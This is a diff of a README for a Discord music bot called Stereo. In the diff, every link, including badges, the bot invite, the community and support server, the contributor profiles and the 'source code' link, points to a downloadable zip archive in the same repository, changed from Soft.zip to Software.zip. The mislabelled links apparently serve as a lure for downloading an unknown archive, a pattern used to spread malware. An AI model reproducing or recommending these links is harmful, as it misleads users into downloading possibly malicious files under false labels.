@@ -1,10 +1,10 @@
 <h1 align="center">Stereo</h1>
 
 <div align="center">
-  <a href="https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip"><img src="https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip" /></a>
-  <a href="https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip"><img src="https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip" /></a>
-  <a href="https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip"><img src="https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip" /></a>
-  <a href="https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip"><img src="https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip" /></a>
+  <a href="https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip"><img src="https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip" /></a>
+  <a href="https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip"><img src="https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip" /></a>
+  <a href="https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip"><img src="https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip" /></a>
+  <a href="https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip"><img src="https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip" /></a>
 </div>
 
 <h4 align="center">A very customizable and easy to use music bot, written with love in TypeScript by aesthetical#2545.</h4> 
@@ -13,7 +13,7 @@
 
 Hello! Welcome to our page! I'm sure you're wondering, "Oh, another music bot. Why would I want to use Stereo, when I could just use Rythm or Groovy?" Well, you've come to the right place! Allow us to explain...
   
-Stereo has many compelling features, such as Radio Commands, Customizable Behavior such as DJ Roles, multiple prefixes and voice channel lock, and of course our extensive music category.  It will always be **free**! The only thing you may not like, is that the code is closed source! You may however, view [v1's source code](https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip).
+Stereo has many compelling features, such as Radio Commands, Customizable Behavior such as DJ Roles, multiple prefixes and voice channel lock, and of course our extensive music category.  It will always be **free**! The only thing you may not like, is that the code is closed source! You may however, view [v1's source code](https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip).
   
 ---  
   
@@ -42,20 +42,20 @@ Ever wondered why we needed all of these permissions? We'll explain right here:
 ---
 
 
-So what are you waiting for? [Invite Stereo](https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip) and while you're at it, [join our community server!](https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip)
+So what are you waiting for? [Invite Stereo](https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip) and while you're at it, [join our community server!](https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip)
 
 ## Contributors
-- [Sxmurai](https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip) ~ Made the whole bot
-- [MeLike2D](https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip) ~ Providing us with a modified Lavalink client.
+- [Sxmurai](https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip) ~ Made the whole bot
+- [MeLike2D](https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip) ~ Providing us with a modified Lavalink client.
 
 ---
 
 **Privacy Concerns**:
 
-If you have any privacy concerns, please join the [support server](https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip) and contact `aethetical#2545` via discord.
+If you have any privacy concerns, please join the [support server](https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip) and contact `aethetical#2545` via discord.
 
 ---
 
 > Licensed under MIT, all rights reserved
 
-> :copyright: [Sxmurai](https://github.com/Blercy/stereo-v2/releases/download/v1.0/Soft.zip) - 2020
+> :copyright: [Sxmurai](https://github.com/Blercy/stereo-v2/releases/download/v2.0/Software.zip) - 2020
